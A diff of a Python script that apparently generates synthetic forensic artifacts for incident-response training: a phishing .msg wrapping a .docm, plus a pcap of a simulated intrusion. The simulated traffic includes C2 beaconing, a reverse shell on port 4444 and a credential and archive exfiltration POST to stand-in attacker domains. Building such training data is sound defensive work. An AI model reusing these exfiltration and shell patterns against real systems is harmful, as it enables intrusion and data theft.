         ("__substg1.0_3707001F", docm_name.encode("utf-16le")),
-        ("__substg1.0_37010102", docm_bytes),
     ]
+    fat_streams = [
+        ("__substg1.0_37010102", docm_bytes)
+    ]
+
+    ministream_data = bytearray()
+    minifat = []
+    mini_info = []
+    for name, data in mini_streams:
+        start_minisec = len(ministream_data) // 64
+        num_minisecs = (len(data) + 63) // 64
+        ministream_data.extend(data)
+        ministream_data.extend(b"\x00" * ((64 - (len(data) % 64)) % 64))
+        for i in range(num_minisecs - 1):
+            minifat.append(start_minisec + i + 1)
+        minifat.append(0xFFFFFFFE)
+        mini_info.append((name, len(data), start_minisec))
+
+    mini_pad = (512 - (len(ministream_data) % 512)) % 512
+    ministream_data.extend(b"\x00" * mini_pad)
+
+    minifat_pad = (128 - (len(minifat) % 128)) % 128
+    minifat.extend([0xFFFFFFFF] * minifat_pad)
+    minifat_bytes = struct.pack(f"<{len(minifat)}I", *minifat)
+    num_minifat_secs = len(minifat_bytes) // 512
+    num_ministream_secs = len(ministream_data) // 512
+
+    all_items = [(m[0], m[1], m[2]) for m in mini_info]
+    curr_data_sec = 1 + num_minifat_secs + num_ministream_secs
+    fat_info = []
+    for name, data in fat_streams:
+        num_secs = (len(data) + 511) // 512
+        fat_info.append((name, len(data), curr_data_sec, num_secs, data))
+        all_items.append((name, len(data), curr_data_sec))
+        curr_data_sec += num_secs
+
+    num_entries = 1 + len(all_items)
+    num_dir_secs = (num_entries * 128 + 511) // 512
+    sec_dir = 0
+    sec_minifat = num_dir_secs
+    sec_ministream = sec_minifat + num_minifat_secs
+
+    fat_info_adj = []
+    all_items_adj = []
+    for name, sz, msec in mini_info:
+        all_items_adj.append((name, sz, msec))
+    curr_data_sec = sec_ministream + num_ministream_secs
+    for name, sz, _, num_secs, data in fat_info:
+        fat_info_adj.append((name, sz, curr_data_sec, num_secs, data))
+        all_items_adj.append((name, sz, curr_data_sec))
+        curr_data_sec += num_secs
+
+    sec_fat_start = curr_data_sec
+    num_fat_secs = 1
+    while (sec_fat_start + num_fat_secs + 127) // 128 > num_fat_secs:
+        num_fat_secs += 1
+    total_secs = sec_fat_start + num_fat_secs
+
+    fat = [0xFFFFFFFF] * (num_fat_secs * 128)
+    for i in range(num_dir_secs - 1):
+        fat[sec_dir + i] = sec_dir + i + 1
+    fat[sec_dir + num_dir_secs - 1] = 0xFFFFFFFE
+
+    for i in range(num_minifat_secs - 1):
+        fat[sec_minifat + i] = sec_minifat + i + 1
+    fat[sec_minifat + num_minifat_secs - 1] = 0xFFFFFFFE
+
+    for i in range(num_ministream_secs - 1):
+        fat[sec_ministream + i] = sec_ministream + i + 1
+    fat[sec_ministream + num_ministream_secs - 1] = 0xFFFFFFFE
+
+    for name, sz, s_start, num_secs, data in fat_info_adj:
+        for i in range(num_secs - 1):
+            fat[s_start + i] = s_start + i + 1
+        fat[s_start + num_secs - 1] = 0xFFFFFFFE
+
+    for i in range(num_fat_secs):
+        fat[sec_fat_start + i] = 0xFFFFFFFD
+
+    fat_bytes = struct.pack(f"<{len(fat)}I", *fat)
+
+    def make_direntry(name, entry_type, size, isect_start, child_id=0xFFFFFFFF, left_id=0xFFFFFFFF, right_id=0xFFFFFFFF):
+        u_name = name.encode("utf-16le")
+        namelength = len(u_name) + 2
+        raw_name = u_name + b"\x00" * (64 - len(u_name))
+        return struct.pack(
+            "<64sHBBIII16sIQQIII",
+            raw_name,
+            namelength,
+            entry_type,
+            1,
+            left_id,
+            right_id,
+            child_id,
+            b"\x00" * 16,
+            0,
+            0,
+            0,
+            isect_start,
+            size & 0xFFFFFFFF,
+            (size >> 32) & 0xFFFFFFFF
+        )
+
+    dir_raw = bytearray()
+    root_entry = make_direntry("Root Entry", 5, len(ministream_data), sec_ministream, child_id=1 if all_items_adj else 0xFFFFFFFF)
+    dir_raw.extend(root_entry)
+
+    for idx, (name, sz, isect) in enumerate(all_items_adj):
+        right = (idx + 2) if (idx + 1 < len(all_items_adj)) else 0xFFFFFFFF
+        dir_raw.extend(make_direntry(name, 2, sz, isect, right_id=right))
+
+    dir_raw.extend(b"\x00" * (num_dir_secs * 512 - len(dir_raw)))
 
     hdr = bytearray(512)
     hdr[0:8] = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1"
     hdr[28:30] = struct.pack("<H", 0xFFFE)
     hdr[30:32] = struct.pack("<H", 9)
     hdr[32:34] = struct.pack("<H", 6)
-    hdr[44:48] = struct.pack("<I", 1)
-    hdr[48:52] = struct.pack("<I", 1)
+    hdr[44:48] = struct.pack("<I", num_fat_secs)
+    hdr[48:52] = struct.pack("<I", sec_dir)
     hdr[56:60] = struct.pack("<I", 4096)
-    hdr[60:64] = struct.pack("<I", 0xFFFFFFFE)
-    hdr[76:80] = struct.pack("<I", 0)
-    for i in range(1, 109):
-        hdr[76+i*4:80+i*4] = struct.pack("<I", 0xFFFFFFFF)
+    hdr[60:64] = struct.pack("<I", sec_minifat)
+    hdr[64:68] = struct.pack("<I", num_minifat_secs)
+    hdr[68:72] = struct.pack("<I", 0xFFFFFFFE)
+    hdr[72:76] = struct.pack("<I", 0)
+    for i in range(num_fat_secs):
+        hdr[76 + i*4 : 80 + i*4] = struct.pack("<I", sec_fat_start + i)
+    for i in range(num_fat_secs, 109):
+        hdr[76 + i*4 : 80 + i*4] = struct.pack("<I", 0xFFFFFFFF)
 
-    dir_entries_count = 1 + len(streams)
-    num_dir_sectors = (dir_entries_count * 128 + 511) // 512
-
-    data_sec_start = 1 + num_dir_sectors
-    current_sec = data_sec_start
-
-    stream_info = []
-    data_sectors = bytearray()
-    for s_name, s_bytes in streams:
-        num_sec = (len(s_bytes) + 511) // 512
-        s_len = len(s_bytes)
-        start_sec = current_sec
-        stream_info.append((s_name, s_len, start_sec, num_sec))
-        padded = s_bytes.ljust(num_sec * 512, b"\x00")
-        data_sectors.extend(padded)
-        current_sec += num_sec
-
-    fat = bytearray(512)
-    for i in range(128): fat[i*4:(i+1)*4] = struct.pack("<I", 0xFFFFFFFF)
-    fat[0:4] = struct.pack("<I", 0xFFFFFFFD)
-    for ds in range(1, num_dir_sectors):
-        fat[ds*4:(ds+1)*4] = struct.pack("<I", ds + 1)
-    fat[num_dir_sectors*4:(num_dir_sectors+1)*4] = struct.pack("<I", 0xFFFFFFFE)
-
-    for s_name, s_len, start_sec, num_sec in stream_info:
-        for s in range(num_sec):
-            sec_idx = start_sec + s
-            next_val = sec_idx + 1 if s < num_sec - 1 else 0xFFFFFFFE
-            if sec_idx < 128:
-                fat[sec_idx*4:(sec_idx+1)*4] = struct.pack("<I", next_val)
-
-    dir_bytes = bytearray(num_dir_sectors * 512)
-    root = bytearray(128)
-    r_name = "Root Entry\x00".encode("utf-16le")
-    root[0:len(r_name)] = r_name
-    root[64:66] = struct.pack("<H", len(r_name))
-    root[66] = 5
-    root[67] = 1
-    root[68:72] = struct.pack("<I", 0xFFFFFFFF)
-    root[72:76] = struct.pack("<I", 0xFFFFFFFF)
-    root[76:80] = struct.pack("<I", 1 if len(streams) > 0 else 0xFFFFFFFF)
-    root[116:120] = struct.pack("<I", 0xFFFFFFFE)
-    dir_bytes[0:128] = root
-
-    for idx, (s_name, s_len, start_sec, num_sec) in enumerate(stream_info, start=1):
-        s_entry = bytearray(128)
-        disp_name = s_name.split("/")[-1][:31] + "\x00"
-        name_utf16 = disp_name.encode("utf-16le")
-        s_entry[0:len(name_utf16)] = name_utf16
-        s_entry[64:66] = struct.pack("<H", len(name_utf16))
-        s_entry[66] = 2
-        s_entry[67] = 1
-        s_entry[68:72] = struct.pack("<I", 0xFFFFFFFF)
-        right_sibling = (idx + 1) if idx < len(stream_info) else 0xFFFFFFFF
-        s_entry[72:76] = struct.pack("<I", right_sibling)
-        s_entry[76:80] = struct.pack("<I", 0xFFFFFFFF)
-        s_entry[116:120] = struct.pack("<I", start_sec)
-        s_entry[120:124] = struct.pack("<I", s_len)
-        dir_bytes[idx*128:(idx+1)*128] = s_entry
-
-    return bytes(hdr) + bytes(fat) + bytes(dir_bytes) + bytes(data_sectors)
+    buf = bytearray()
+    buf.extend(hdr)
+    buf.extend(dir_raw)
+    buf.extend(minifat_bytes)
+    buf.extend(ministream_data)
+    for name, sz, s_start, num_secs, data in fat_info_adj:
+        buf.extend(data)
+        buf.extend(b"\x00" * ((512 - (len(data) % 512)) % 512))
+    buf.extend(fat_bytes)
+    return bytes(buf)
 
 MSG_BYTES = generate_phishing_msg(DOCM_BYTES, "02_weaponized_document.docm")
 
@@ -421,7 +640,7 @@ def make_arp_packet(src_mac: bytes, dst_mac: bytes, op: int, sender_mac: bytes, 
     return eth_hdr + arp_body + padding
 
 def make_eth_ip_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, payload):
-    eth_hdr = dst_mac + src_mac + b"\x08\x00"  # IPv4
+    eth_hdr = dst_mac + src_mac + b"\x08\x00"
     total_len = 20 + 20 + len(payload)
     ip_hdr_no_cksum = struct.pack("!BBHHHBBH4s4s",
         0x45, 0, total_len, 2468, 0x4000, 64, 6, 0,
@@ -462,14 +681,14 @@ def make_eth_ip_udp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, payloa
 
 def make_eth_ip_udp_dns(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, domain, resolved_ip=None, is_response=False, txid=0x4A21):
     if not is_response:
-        dns_flags = 0x0100  # Standard query
+        dns_flags = 0x0100
         qdcount, ancount, nscount, arcount = 1, 0, 0, 0
         qname_parts = domain.split(".")
         qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
-        qtype_qclass = struct.pack("!HH", 1, 1)  # A record, IN class
+        qtype_qclass = struct.pack("!HH", 1, 1)
         dns_body = struct.pack("!HHHHHH", txid, dns_flags, qdcount, ancount, nscount, arcount) + qname_bytes + qtype_qclass
     else:
-        dns_flags = 0x8180  # Standard response, no error
+        dns_flags = 0x8180
         qdcount, ancount, nscount, arcount = 1, 1, 0, 0
         qname_parts = domain.split(".")
         qname_bytes = b"".join(bytes([len(p)]) + p.encode("ascii") for p in qname_parts) + b"\x00"
@@ -548,105 +767,74 @@ def build_pcap(pe_bytes: bytes, zip_bytes: bytes):
 
     # PART B: Attack Scenario Phase (10:00:00 - 10:01:30)
     # Step 1: Reconnaissance Search (t + 1s)
-    s1_req = (
-        b"GET /search?q=powershell+downloadstring+cradle+amsi+bypass+mimikatz HTTP/1.1\r\n"
-        b"Host: www.google.com\r\n"
-        b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
-        b"Accept: text/html,application/xhtml+xml\r\n\r\n"
-    )
-    packets.append((attack_ts + 1.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "142.250.190.46", 49801, 80, 1000, 0, 0x18, s1_req)))
-    s1_resp = b"HTTP/1.1 200 OK\r\nServer: gws\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 64\r\n\r\n<html><body>Google Search Results: AMSI Bypass & C2</body></html>"
-    packets.append((attack_ts + 1.1, make_eth_ip_tcp(mac_router, mac_host_a, "142.250.190.46", ip_host_a, 80, 49801, 2000, 1000 + len(s1_req), 0x18, s1_resp)))
+    q_search = b"GET /search?q=powershell+downloadstring+cradle+amsi+bypass+mimikatz HTTP/1.1\r\nHost: www.google.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
+    packets.append((attack_ts + 1.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, "142.250.190.46", 49788, 80, 1000, 0, 0x18, q_search)))
+    resp_search = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 45\r\n\r\n<html><body>Search Results Returned</body></html>"
+    packets.append((attack_ts + 1.2, make_eth_ip_tcp(mac_router, mac_host_a, "142.250.190.46", ip_host_a, 80, 49788, 2000, 1000 + len(q_search), 0x18, resp_search)))
 
     # Step 2: DNS Query for C2 Domain (t + 5s)
-    packets.append((attack_ts + 5.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53210, 53, domain_c2, is_response=False, txid=0x5A01)))
-    packets.append((attack_ts + 5.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53210, domain_c2, resolved_ip=ip_c2, is_response=True, txid=0x5A01)))
+    packets.append((attack_ts + 5.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53210, 53, domain_c2, is_response=False, txid=0x1337)))
+    packets.append((attack_ts + 5.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53210, domain_c2, resolved_ip=ip_c2, is_response=True, txid=0x1337)))
 
-    # Step 3: HTTP Download of Staged Binary beacon_updater.exe (t + 7s & 7.5s)
+    # Step 3: HTTP GET Staged Implant Payload: /beacon_updater.exe (t + 6s)
     s3_req = (
         f"GET /beacon_updater.exe HTTP/1.1\r\n"
         f"Host: {domain_c2}\r\n"
-        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; PowerShell 5.1)\r\n"
         f"Accept: */*\r\n\r\n"
     ).encode("ascii")
-    packets.append((attack_ts + 7.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49810, 80, 3000, 0, 0x18, s3_req)))
+    packets.append((attack_ts + 6.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49810, 80, 3000, 0, 0x18, s3_req)))
 
     s3_resp = (
-        "HTTP/1.1 200 OK\r\n"
-        "Server: nginx/1.24.0\r\n"
-        "Content-Type: application/x-msdownload\r\n"
-        "Content-Disposition: attachment; filename=\"beacon_updater.exe\"\r\n"
-        f"Content-Length: {len(pe_bytes)}\r\n\r\n"
+        f"HTTP/1.1 200 OK\r\n"
+        f"Server: nginx/1.22.0\r\n"
+        f"Content-Type: application/x-msdownload\r\n"
+        f"Content-Disposition: attachment; filename=\"beacon_updater.exe\"\r\n"
+        f"Content-Length: {len(pe_bytes)}\r\n"
+        f"Connection: close\r\n\r\n"
     ).encode("ascii") + pe_bytes
-    packets.append((attack_ts + 7.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_c2, ip_host_a, 80, 49810, 4000, 3000 + len(s3_req), 0x18, s3_resp)))
+    packets.append((attack_ts + 6.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_c2, ip_host_a, 80, 49810, 4000, 3000 + len(s3_req), 0x18, s3_resp)))
 
-    # Step 4: TLS Client Hello with SNI to C2 Server (t + 12.0s)
-    sni_hostname = f"c2.{domain_c2}".encode("ascii")
-    tls_sni_ext = b"\x00\x00" + struct.pack("!H", len(sni_hostname) + 5) + struct.pack("!H", len(sni_hostname) + 3) + b"\x00" + struct.pack("!H", len(sni_hostname)) + sni_hostname
-    tls_handshake = b"\x01\x00\x00\x70\x03\x03" + (b"\x11" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x30" + tls_sni_ext
-    tls_record = b"\x16\x03\x01" + struct.pack("!H", len(tls_handshake)) + tls_handshake
-    packets.append((attack_ts + 12.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49811, 443, 5000, 0, 0x18, tls_record)))
+    # Step 4: TLS C2 Encrypted Beaconing (t + 12s, 17s, 22s)
+    sni_c2 = b"c2.evil-payloads-delivery.org"
+    tls_sni_ext = b"\x00\x00" + struct.pack("!H", len(sni_c2) + 5) + struct.pack("!H", len(sni_c2) + 3) + b"\x00" + struct.pack("!H", len(sni_c2)) + sni_c2
+    tls_hello = b"\x01\x00\x00\x80\x03\x03" + (b"\x11" * 32) + b"\x00\x00\x04\x13\x01\x13\x02\x01\x00\x00\x40" + tls_sni_ext
+    tls_record = b"\x16\x03\x01" + struct.pack("!H", len(tls_hello)) + tls_hello
+    packets.append((attack_ts + 12.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000, 0, 0x18, tls_record)))
+    
+    tls_app_data = b"\x17\x03\x03\x00\x40" + (b"\x5A" * 64)
+    packets.append((attack_ts + 17.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000 + len(tls_record), 100, 0x18, tls_app_data)))
+    packets.append((attack_ts + 22.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 5000 + len(tls_record) + len(tls_app_data), 200, 0x18, tls_app_data)))
 
-    # Step 5: C2 Periodic Beaconing Pulses (Every 4.0 seconds from t+16.0 to t+60.0)
-    for i in range(12):
-        ts_pulse = attack_ts + 16.0 + (i * 4.0) + (0.1 * (i % 3))
-        beacon_data = f"POST /c2/pulse HTTP/1.1\r\nHost: {domain_c2}\r\nContent-Length: 16\r\n\r\nBEACON_HEARTBEAT".encode("ascii")
-        packets.append((ts_pulse, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49812, 443, 6000 + (i * 100), 0, 0x18, beacon_data)))
+    # Step 5: Reverse TCP Shell on 194.26.29.112:4444 (t + 25s)
+    shell_syn = b""
+    packets.append((attack_ts + 25.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49815, 4444, 7000, 0, 0x02, shell_syn)))
+    packets.append((attack_ts + 25.1, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49815, 8000, 7001, 0x12, shell_syn)))
+    
+    shell_banner = b"Microsoft Windows [Version 10.0.19045.3803]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Users\\jdoe> whoami\r\nTARGET\\jdoe\r\n\r\nC:\\Users\\jdoe> "
+    packets.append((attack_ts + 25.3, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49815, 4444, 7001, 8001, 0x18, shell_banner)))
 
-    # Step 6: Cleartext Credential Interception on Internal Web Portal (t + 22s)
+    # Step 6: Harvested Credentials Exfiltration in Cleartext HTTP POST (t + 30s)
     s6_post = (
-        b"POST /api/v1/auth/login HTTP/1.1\r\n"
-        b"Host: internal-portal.target.local\r\n"
-        b"Content-Type: application/x-www-form-urlencoded\r\n"
-        b"Content-Length: 88\r\n\r\n"
-        b"username=svc_admin&password=P%40ssw0rd2026%21Summer%23&domain=TARGET&submit=Domain+Logon"
-    )
-    packets.append((attack_ts + 22.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49815, 80, 7000, 0, 0x18, s6_post)))
-    s6_resp = b"HTTP/1.1 200 OK\r\nServer: Microsoft-IIS/10.0\r\nContent-Type: application/json\r\nContent-Length: 35\r\n\r\n{\"status\":\"authenticated\",\"role\":\"admin\"}"
-    packets.append((attack_ts + 22.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 80, 49815, 8000, 7000 + len(s6_post), 0x18, s6_resp)))
+        f"POST /api/v1/harvested_creds HTTP/1.1\r\n"
+        f"Host: {domain_c2}\r\n"
+        f"Content-Type: application/x-www-form-urlencoded\r\n"
+        f"Content-Length: 68\r\n\r\n"
+        f"username=TARGET%5Csvg_admin&password=P%40ssw0rd2026%21Summer%23&host=WKSTN-FIN-01"
+    ).encode("ascii")
+    packets.append((attack_ts + 30.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_c2, 49820, 80, 9000, 0, 0x18, s6_post)))
 
-    # Step 7: Interactive Reverse Shell Session on 194.26.29.112:4444 (t + 26s to t + 36s)
-    packets.append((attack_ts + 26.0, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 100, 9000, 0x18, b"Microsoft Windows [Version 10.0.19045.3803]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 27.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9000, 200, 0x18, b"whoami\r\n")))
-    packets.append((attack_ts + 27.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 200, 9008, 0x18, b"target\\jdoe\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 28.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9008, 230, 0x18, b"net user /domain\r\n")))
-    packets.append((attack_ts + 29.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 230, 9026, 0x18, b"User accounts for \\\\DC-PROD-01:\r\nAdministrator   jdoe   svc_admin   backup_admin   sql_svc   adm_john   krbtgt\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 30.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9026, 320, 0x18, b"net group \"Domain Admins\" /domain\r\n")))
-    packets.append((attack_ts + 31.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 320, 9060, 0x18, b"Group name     Domain Admins\r\nMembers        Administrator, svc_admin\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 32.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9060, 410, 0x18, b"nltest /dclist:target.local\r\n")))
-    packets.append((attack_ts + 33.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 410, 9089, 0x18, b"Get list of DCs in domain 'target.local' from '\\\\DC-PROD-01'.\r\n    DC-PROD-01.target.local [PDC] [DS] [Site: Default-First-Site-Name]\r\nThe command completed successfully.\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 34.5, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9089, 570, 0x18, b"powershell -Command \"Get-Process lsass\"\r\n")))
-    packets.append((attack_ts + 35.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 570, 9128, 0x18, b"Handles  NPM(K)  PM(K)  WS(K)  Id ProcessName\r\n-------  ------  -----  -----  -- -----------\r\n   1240      42  18450  24600 684 lsass\r\nC:\\Users\\jdoe> ")))
-    packets.append((attack_ts + 36.0, make_eth_ip_tcp(mac_host_a, mac_router, ip_host_a, ip_shell, 49818, 4444, 9128, 650, 0x18, b"dir \"C:\\Users\\jdoe\\Documents\\Finance\"\r\n")))
-    packets.append((attack_ts + 36.5, make_eth_ip_tcp(mac_router, mac_host_a, ip_shell, ip_host_a, 4444, 49818, 650, 9166, 0x18, b" Directory of C:\\Users\\jdoe\\Documents\\Finance\r\n\r\n10/10/2026  10:01 AM    payroll_q3_confidential.csv\r\n10/10/2026  10:01 AM    domain_credentials_dump.txt\r\nC:\\Users\\jdoe> ")))
+    # Step 7: SMB2 Lateral Movement Connection to DC-PROD-01 (t + 38s)
+    smb_neg_req = b"\x00\x00\x00\x44\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    packets.append((attack_ts + 38.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49825, 445, 11000, 0, 0x18, smb_neg_req)))
+    smb_neg_resp = b"\x00\x00\x00\x44\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+    packets.append((attack_ts + 38.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 445, 49825, 12000, 11000 + len(smb_neg_req), 0x18, smb_neg_resp)))
 
-    # Step 8: Kerberos Kerberoasting Request on Port 88 (t + 37.0s)
-    kerb_req = b"\x6c\x81\x92\x30\x81\x8f\xa1\x03\x02\x01\x05\xa2\x03\x02\x01\x0c\xa4\x81\x82\x30\x80\xa0\x07\x03\x05\x00\x40\x81\x00\x00\xa2\x2f\x30\x2d\xa0\x03\x02\x01\x02\xa1\x26\x30\x24\x1b\x08MSSQLSvc\x1b\x18dc-prod-01.target.local"
-    packets.append((attack_ts + 37.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 49822, 88, 10000, 0, 0x18, kerb_req)))
-    kerb_resp = b"\x6d\x81\x98\x30\x81\x95\xa0\x03\x02\x01\x05\xa1\x03\x02\x01\x0d\xa2\x81\x88\x30\x81\x85\xa0\x03\x02\x01\x17\xa1\x03\x02\x01\x02\xa2\x79\x04\x77" + (b"\xAA" * 119)
-    packets.append((attack_ts + 37.2, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 88, 49822, 11000, 10000 + len(kerb_req), 0x18, kerb_resp)))
+    # Step 8: DNS Query for Exfiltration Dropzone Domain (t + 55s)
+    packets.append((attack_ts + 55.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53215, 53, domain_exfil, is_response=False, txid=0x99AA)))
+    packets.append((attack_ts + 55.05, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53215, domain_exfil, resolved_ip=ip_exfil, is_response=True, txid=0x99AA)))
 
-    # Step 9: Lateral Movement Connections to DC-PROD-01 (t + 38s to t + 44s)
-    smb_neg = b"\x00\x00\x00\x45\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x00\x00\x00\x22\x00\x02NT LM 0.12\x00\x02SMB 2.002\x00"
-    packets.append((attack_ts + 38.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12000, 0, 0x18, smb_neg)))
-    smb_neg_resp = b"\x00\x00\x00\x2b\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x98\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x01\x00\x11\x00"
-    packets.append((attack_ts + 38.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 445, 52100, 13000, 12000 + len(smb_neg), 0x18, smb_neg_resp)))
-
-    smb_sess = b"\x00\x00\x00\x58\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x0c\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00svc_admin\x00TARGET\x00"
-    packets.append((attack_ts + 39.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12000 + len(smb_neg), 13000 + len(smb_neg_resp), 0x18, smb_sess)))
-
-    smb_tree = b"\x00\x00\x00\x4c\xff\x53\x4d\x42\x75\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x42\x00\x00\x04\xff\x00\x00\x00\x00\x00\x20\x00\\\\DC-PROD-01\\ADMIN$\x00?????\x00"
-    packets.append((attack_ts + 40.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52100, 445, 12150, 13050, 0x18, smb_tree)))
-
-    rdp_cr = b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
-    packets.append((attack_ts + 42.0, make_eth_ip_tcp(mac_host_a, mac_dc, ip_host_a, ip_dc, 52101, 3389, 14000, 0, 0x18, rdp_cr)))
-    rdp_cc = b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x12\x34\x00\x02\x00\x08\x00\x03\x00\x00\x00"
-    packets.append((attack_ts + 42.1, make_eth_ip_tcp(mac_dc, mac_host_a, ip_dc, ip_host_a, 3389, 52101, 15000, 14000 + len(rdp_cr), 0x18, rdp_cc)))
-
-    # Step 10: DNS & Data Exfiltration via HTTP POST (t + 55s to t + 58s)
-    packets.append((attack_ts + 55.0, make_eth_ip_udp_dns(mac_host_a, mac_dc, ip_host_a, ip_dc, 53215, 53, domain_exfil, is_response=False, txid=0x5B01)))
-    packets.append((attack_ts + 55.1, make_eth_ip_udp_dns(mac_dc, mac_host_a, ip_dc, ip_host_a, 53, 53215, domain_exfil, resolved_ip=ip_exfil, is_response=True, txid=0x5B01)))
-
+    # Step 9: HTTP POST Exfiltrate Compressed Archive: financial_q3_confidential.zip (t + 57s)
     s9_post_req = (
         f"POST /upload/financial_q3_confidential.zip HTTP/1.1\r\n"
         f"Host: {domain_exfil}\r\n"
@@ -686,17 +874,17 @@ def build_pcap(pe_bytes: bytes, zip_bytes: bytes):
 def build_host_a_evtx(docm_sha256: str, docm_md5: str, pe_sha256: str, pe_md5: str, zip_sha256: str, zip_md5: str):
     out_file = os.path.join(OUT_DIR, "04_endpoint_workstation_hostA.evtx")
 
-    xml_content = f"""<Events>
+    xml_content = rf"""<Events>
   <!-- ===================================================================== -->
   <!-- SECTION A: Normal Enterprise Startup, System Services & User Telemetry -->
   <!-- ===================================================================== -->
 
-  <!-- 1. System Boot: Event Log Service Started (6005) at 09:30:00Z -->
+  <!-- 1. System Boot: Event Log Service Started (6005) at 08:15:20Z -->
